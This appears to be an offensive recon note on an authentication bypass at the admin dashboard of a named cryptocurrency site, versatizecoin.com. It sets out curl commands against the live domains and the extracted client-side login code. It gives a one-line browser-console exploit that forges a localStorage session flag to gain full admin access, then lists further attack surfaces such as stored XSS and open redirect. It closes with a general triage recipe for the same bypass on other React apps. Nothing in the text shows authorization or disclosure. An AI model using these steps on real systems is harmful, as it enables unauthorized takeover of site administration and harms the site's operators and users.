# VersatizeCoin Admin localStorage Bypass — 2026-08-16 (ARCHITECT)

**Targets:** `www.versatizecoin.com` (VTCN/BC Hyper Chain) + `admin.versatizecoin.com` (VTCN Admin Dashboard)
**Stack:** Vite + React 19.2.3 + react-router-dom 7.10.1 + Cloudflare. No backend API on main domain.

## Discovery
- Main SPA: `curl -sL https://www.versatizecoin.com/` → single Vite bundle `/assets/index-CXmqaNgO.js` 969KB, importmap `esm.sh` (`@google/genai@1.33.0`, `react`, `recharts`). Routes via `path:"/tokenomics"` etc: `/`, `/tokenomics`, `/ecosystem`, `/docs`, `/community`, `/blog`, `/PrivacyPolicy`, `/listings`, `/brand-assets`, `/# /investor-portal`.
- Admin found by brute `api/admin/docs...` → `admin` returned 200 (same Vite shell): `/assets/index-C5PL2nl1.js` 879KB. `grep -n "localStorage"` was decisive.

## Auth Flaw (TB-1 — pre-auth takeover)
```js
// /tmp/admin_bundle.js:376 (Xee component)
C.useEffect(()=>{localStorage.getItem("vtcn_session")&&t(!0),window.innerWidth<1024&&v(!1)},[]);
const T=()=>{t(!0),localStorage.setItem("vtcn_session","active")},  // login success
      M=()=>{t(!1),localStorage.removeItem("vtcn_session"),r(Sr.Dashboard)} // logout
// Jee login (Kee = recovery decoy):
const f=h=>{h.preventDefault(),s(!0),setTimeout(()=>{e(),s(!1)},1500)}; // e = T
// No fetch, no password check, no cookie, no JWT
```
- Login page `Jee`: `Operator ID` + `Encryption Key` inputs are not validated — any value + `setTimeout 1500` → `vtcn_session=active`.
- Dashboard `Xee` routers internally: `Sr.Dashboard→Vee`, `Sr.Blog→EL`, `Sr.Subscribers→Uq`, `Sr.Feedback→Lq`, `Sr.Documents→Fee`, `Sr.Social→$ee`, `Sr.Settings→zq`.

**Repro:**
```bash
curl -sk https://admin.versatizecoin.com/ | grep -o 'assets/index-.*\.js'
curl -sk https://admin.versatizecoin.com/assets/index-C5PL2nl1.js | grep -n localStorage
# Browser console:
localStorage.setItem("vtcn_session","active"); location.reload()
# → full admin: Growth Analytics, Community Activity, Documents (Fee), Social ($ee) editors
```

## Dashboard Surfaces (post-bypass)
- **Fee (Documents):** `type: PDF|External|HTML` — HTML mode renders `<textarea placeholder="<p>Content code here...</p>">` → if ever wired to public `/docs` without DOMPurify = stored XSS.
- **$ee (Social):** 7 editable URLs (twitter/telegram/discord/facebook/instagram/whatsapp/youtube) → `href={n.url} target=_blank` without scheme validation → open redirect/phishing.
- **EL/Uq/Lq:** Blog/Subscribers/Feedback are `useState` local only today (no persistence), but design anticipates backend sync — future stored XSS via `a.message`.

## Triage Rule
For any Vite/React SPA admin, always:
1. `grep -n "localStorage\|sessionStorage\|document.cookie" bundle.js`
2. Look for `getItem(".*session.*") && set` pattern + `setItem(".*","active")`
3. Test forge before testing Firebase/Supabase — localStorage gate is the cheapest bypass.

## Related
- `web2-spa-recon/references/versatizecoin-vite-spa-fuzz-2026-08.md` — main-site SPA trap, Gemini XV="" empty key, aggrigator CORS*, BCH RPC 6060
- Main site trust boundaries TB-2..TB-12 (oracle poisoning, prompt injection, supply chain `esm.sh` no integrity)
